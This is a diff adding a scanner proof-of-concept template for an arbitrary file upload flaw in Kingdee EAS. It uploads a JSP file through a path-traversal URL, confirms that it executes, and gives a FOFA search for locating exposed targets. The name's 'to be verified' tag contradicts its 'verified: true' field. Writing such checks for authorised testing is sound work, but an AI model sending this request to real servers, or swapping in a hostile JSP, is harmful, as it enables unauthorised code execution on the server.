@@ -1,0 +1,45 @@
+id: kingdee-eas-myuploadfile-upload
+
+info:
+  name: Kingdee EAS myUploadFile Upload [待验证]
+  author: ct
+  severity: high
+  verified: true
+  description: |
+    金蝶云EAS myUploadFile.do 接口存在任意文件上传漏洞，攻击者可以上传任意文件控制服务器.
+    fofa: title=="EAS系统登录" 
+
+set:
+  hostname: request.url.host
+  randname: randomLowercase(6)
+  randbody: randomLowercase(6)
+
+rules:
+  r0:
+    request:
+      raw: |
+        POST /easportal/buffalo/%2e%2e/cm/myUploadFile.do HTTP/1.1
+        Host: {{hostname}}
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarycxkT8bV6WLIUzm2p
+        Content-Length: 147
+
+        ------WebKitFormBoundarycxkT8bV6WLIUzm2p
+        Content-Disposition: form-data; name="myFile"; filename="{{randname}}.jsp"
+        Content-Type: text/html
+
+        <%out.println("{{randbody}}");%>
+        ------WebKitFormBoundarycxkT8bV6WLIUzm2p--
+    expression: response.status == 200
+  r1:
+    request:
+      method: GET
+      path: /easportal/buffalo/../{{randname}}.jsp
+    expression: response.status == 200 && response.body.bcontains(bytes(randbody))
+expression: r0() && r1()
